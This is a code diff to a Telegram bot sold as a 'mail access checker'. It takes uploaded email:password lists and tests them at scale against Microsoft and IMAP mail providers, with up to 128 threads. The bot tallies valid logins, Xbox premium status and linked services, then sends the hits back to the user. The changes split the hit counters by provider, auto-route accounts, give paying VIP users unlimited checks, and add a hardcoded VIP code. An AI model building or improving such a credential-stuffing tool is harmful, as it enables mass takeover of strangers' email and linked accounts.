@@ -1259,6 +1259,17 @@ class ScanSession:
         self.country_results = {}
         self.username = ""
         self.plan = ""
+        # Separate counters for MS and MIX
+        self.ms_checked = 0
+        self.ms_hits = 0
+        self.ms_bads = 0
+        self.ms_service_counts = {}
+        self.ms_status_msg_id = None
+        self.mix_checked = 0
+        self.mix_hits = 0
+        self.mix_bads = 0
+        self.mix_service_counts = {}
+        self.mix_status_msg_id = None
 
     def stop(self):
         self.stop_ev.set()
@@ -1278,42 +1289,51 @@ class BotApp:
         vip_tag = " [VIP]" if is_vip else ""
         
         with self.lock:
-            if sess.is_imap:
-                # status for "Another" mode
-                types_str = ", ".join([f"{dom}:{count}" for dom, count in sess.imap_hits_by_domain.items()]) or "-"
-                services = ", ".join([f"{k}:{v}" for k, v in sorted(sess.service_counts.items(), key=lambda x: (-x[1], x[0]))[:5]]) or "-"
-                msg = (
-                    f"Q bot mail access checker{vip_tag}\n"
-                    f"hits : {sess.hits}\n"
-                    f"bad : {sess.bads}\n"
-                    f"type : {types_str}\n"
-                    f"services : {services}\n"
-                )
-                if sess.custom_domains:
-                    tgt_pairs = [f"{t}:{sess.service_counts.get(t,0)}" for t in sess.custom_domains]
-                    msg += f"your targert services : {', '.join(tgt_pairs)}\n"
-                msg += "By : anon\nchannel : @anon_main1"
-            else:
-                countries = ", ".join([f"{k}:{v}" for k, v in sorted(sess.country_counts.items(), key=lambda x: (-x[1], x[0]))[:10]]) or "-"
-                services = ", ".join([f"{k}:{v}" for k, v in sorted(sess.service_counts.items(), key=lambda x: (-x[1], x[0]))[:5]]) or "-"
-                msg = (
-                    f"Q bot mail access checker{vip_tag}\n"
-                    f"hits : {sess.hits}\n"
-                    f"bad : {sess.bads}\n"
-                    f"xbox : {sess.xbox_premium}\n"
-                    f"country : {countries}\n"
-                    f"services : {services}\n"
-                )
-                if sess.custom_domains:
-                    tgt_pairs = [f"{t}:{sess.service_counts.get(t,0)}" for t in sess.custom_domains]
-                    msg += f"your targert services : {', '.join(tgt_pairs)}\n"
-                msg += "By : anon\nchannel : @anon_main1"
-        if sess.status_msg_id:
-            edit_message(chat_id, sess.status_msg_id, msg)
+            # Microsoft status
+            countries_ms = ", ".join([f"{k}:{v}" for k, v in sorted(sess.country_counts.items(), key=lambda x: (-x[1], x[0]))[:10]]) or "-"
+            services_ms = ", ".join([f"{k}:{v}" for k, v in sorted(sess.ms_service_counts.items(), key=lambda x: (-x[1], x[0]))[:5]]) or "-"
+            ms_msg = (
+                f"Q bot mail access checker{vip_tag}\n"
+                f"check microsoft ( hotmail , outlook , etc )\n"
+                f"hits : {sess.ms_hits}\n"
+                f"bad : {sess.ms_bads}\n"
+                f"xbox : {sess.xbox_premium}\n"
+                f"country : {countries_ms}\n"
+                f"services : {services_ms}\n"
+                "By : anon\n"
+                "channel : @anon_main1"
+            )
+            # MIX status
+            types_str = ", ".join([f"{dom}:{count}" for dom, count in sess.imap_hits_by_domain.items()]) or "-"
+            services_mix = ", ".join([f"{k}:{v}" for k, v in sorted(sess.mix_service_counts.items(), key=lambda x: (-x[1], x[0]))[:5]]) or "-"
+            mix_msg = (
+                f"Q bot mail access checker{vip_tag}\n"
+                f"check mix ( t-online.de , gmx , etc )\n"
+                f"hits : {sess.mix_hits}\n"
+                f"bad : {sess.mix_bads}\n"
+                f"type : {types_str}\n"
+                f"services : {services_mix}\n"
+                "By : anon\n"
+                "channel : @anon_main1"
+            )
+        # Send/edit MS status
+        if sess.ms_status_msg_id:
+            try: edit_message(chat_id, sess.ms_status_msg_id, ms_msg)
+            except: pass
         else:
             try:
-                r = send_message(chat_id, msg)
-                sess.status_msg_id = r.get("result", {}).get("message_id")
+                r = send_message(chat_id, ms_msg)
+                sess.ms_status_msg_id = r.get("result", {}).get("message_id")
+            except Exception:
+                pass
+        # Send/edit MIX status
+        if sess.mix_status_msg_id:
+            try: edit_message(chat_id, sess.mix_status_msg_id, mix_msg)
+            except: pass
+        else:
+            try:
+                r = send_message(chat_id, mix_msg)
+                sess.mix_status_msg_id = r.get("result", {}).get("message_id")
             except Exception:
                 pass
         sess.last_status_time = now
@@ -1421,7 +1441,9 @@ class BotApp:
                 if sess.stop_ev.is_set():
                     return
                 em, pw = acc
-                if sess.is_imap:
+                ms_domains = ('outlook.', 'hotmail.', 'live.', 'msn.', 'windowslive.')
+                is_ms = any(d in em for d in ms_domains)
+                if not is_ms:
                     try:
                         checker = ImapChecker()
                         r = checker.check(em, pw)
@@ -1431,6 +1453,10 @@ class BotApp:
                         return
                     with self.lock:
                         sess.checked += 1
+                        sess.mix_checked += 1
+                        is_vip_local = (chat_id in vip_users_info)
+                        if is_vip_local and (sess.checked % 200 == 0):
+                            self._flush_batch(sess, chat_id, flush_all=True)
                     if r and r.get("status") == "HIT":
                         line = f"{em}:{pw}"
                         sv = r.get("services", {}) or {}
@@ -1441,10 +1467,12 @@ class BotApp:
                         with self.lock:
                             sess.results.append(line)
                             sess.hits += 1
+                            sess.mix_hits += 1
                             sess.imap_hits_by_domain[dom] = sess.imap_hits_by_domain.get(dom, 0) + 1
                             for k, v in sv.items():
                                 if v:
                                     sess.service_counts[k] = sess.service_counts.get(k, 0) + 1
+                                    sess.mix_service_counts[k] = sess.mix_service_counts.get(k, 0) + 1
                         with sess.hits_batch_lock:
                             sess.batch.append(line)
                             if len(sess.batch) >= flush_threshold:
@@ -1452,6 +1480,7 @@ class BotApp:
                     else:
                         with self.lock:
                             sess.bads += 1
+                            sess.mix_bads += 1
                 else:
                     try:
                         checker = UnifiedChecker(debug=False)
@@ -1469,6 +1498,10 @@ class BotApp:
                         return
                     with self.lock:
                         sess.checked += 1
+                        sess.ms_checked += 1
+                        is_vip_local = (chat_id in vip_users_info)
+                        if is_vip_local and (sess.checked % 200 == 0):
+                            self._flush_batch(sess, chat_id, flush_all=True)
                     if r and r.get("status") == "HIT":
                         line = format_result(r)
                         sv = r.get("services", {}) or {}
@@ -1482,6 +1515,7 @@ class BotApp:
                         with self.lock:
                             sess.results.append(line)
                             sess.hits += 1
+                            sess.ms_hits += 1
                             if xbox_line:
                                 sess.results_xbox.append(xbox_line)
                             xb_status = (r.get("xbox") or {}).get("status", "").upper()
@@ -1496,6 +1530,7 @@ class BotApp:
                             for k, v in sv.items():
                                 if v:
                                     sess.service_counts[k] = sess.service_counts.get(k, 0) + 1
+                                    sess.ms_service_counts[k] = sess.ms_service_counts.get(k, 0) + 1
                         with sess.hits_batch_lock:
                             sess.batch.append(line)
                             if xbox_line:
@@ -1505,9 +1540,10 @@ class BotApp:
                     else:
                         with self.lock:
                             sess.bads += 1
+                            sess.ms_bads += 1
                 if sess.checked % 20 == 0:
                     self._send_status(sess, chat_id)
-                time.sleep(0 if is_vip else 0.0)
+                time.sleep(0 if (chat_id in vip_users_info) else 0.0)
             max_w = max(16, min(128, (os.cpu_count() or 4) * 8))
             ex = ThreadPoolExecutor(max_workers=max_w)
             fs = [ex.submit(worker, acc) for acc in sub_accounts]
@@ -1631,24 +1667,11 @@ class BotApp:
         
         sess.pending_accounts = accounts
 
-        # split domains for Mail Access mode
-        ms_domains = ('outlook.', 'hotmail.', 'live.', 'msn.', 'windowslive.')
-        sess.accounts_microsoft = []
-        sess.accounts_another = []
-        for em, pw in accounts:
-            if any(dom in em for dom in ms_domains):
-                sess.accounts_microsoft.append((em, pw))
-            else:
-                sess.accounts_another.append((em, pw))
-        
-        # interactive buttons for mode selection
-        kb = {
-            "inline_keyboard": [
-                [{"text": f"microsoft ( hotmail , outlook , etc ) [{len(sess.accounts_microsoft)}]", "callback_data": f"MODE_SELECT_MS_{chat_id}"}],
-                [{"text": f"another ( t-donline , sfr.fr , etc ) [{len(sess.accounts_another)}]", "callback_data": f"MODE_SELECT_IMAP_{chat_id}"}]
-            ]
-        }
-        send_message(chat_id, "Select accounts to scan:", reply_markup=kb)
+        if chat_id in vip_users_info:
+            t = threading.Thread(target=self.start_scan, args=(chat_id, accounts), daemon=True)
+            t.start()
+        else:
+            self._handle_free_flow(chat_id, sess)
 
     def _handle_mode_select(self, chat_id, mode):
         with self.lock:
@@ -1682,18 +1705,13 @@ class BotApp:
 
     def _handle_vip_flow(self, chat_id, sess):
         accounts = sess.pending_accounts
-        if sess.is_imap:
-            t = threading.Thread(target=self.start_scan, args=(chat_id, accounts), daemon=True)
-            t.start()
-        else:
-            sess.awaiting_domain = True
-            kb = {"inline_keyboard": [[{"text": "Skip", "callback_data": f"SKIP_{chat_id}"}]]}
-            send_message(chat_id, "Send target services/domains (comma separated), e.g.: netflix.com, steam, ...\nOr press Skip", reply_markup=kb)
+        t = threading.Thread(target=self.start_scan, args=(chat_id, accounts), daemon=True)
+        t.start()
 
     def _handle_free_flow(self, chat_id, sess):
         accounts = sess.pending_accounts
         allow, mins = check_user_limit(chat_id, 0)
-        send_message(chat_id, "your plan is free\n100 accounts\nevery 2hr")
+        send_message(chat_id, "your plan is free\n100 accounts\nevery 2hr\nif you want unlimited check , send msg here : @anon_101")
         
         rec = user_usage.get(chat_id) or {}
         prev_count = rec.get("count", 0)
@@ -1821,12 +1839,7 @@ class BotApp:
                                 continue
 
                             if txt.lower() in ("/start", "start"):
-                                kb = {
-                                    "inline_keyboard": [
-                                        [{"text": "📧 Mail Access Checker", "callback_data": "MODE_MAIL"}]
-                                    ]
-                                }
-                                send_message(chat_id, "Welcome! Please choose a checker mode:", reply_markup=kb)
+                                send_message(chat_id, "مرحبا بك في q bot\nاذا حصلت على كود vip ارسل الكود الآن\nواذا لا يوجد لديك كود ارسل الملف للفحص مباشرة")
                                 continue
                             # user claims VIP code
                             if txt.lower().startswith("code") or txt.lower().startswith("vip") or txt.lower() == "codevipanon199":
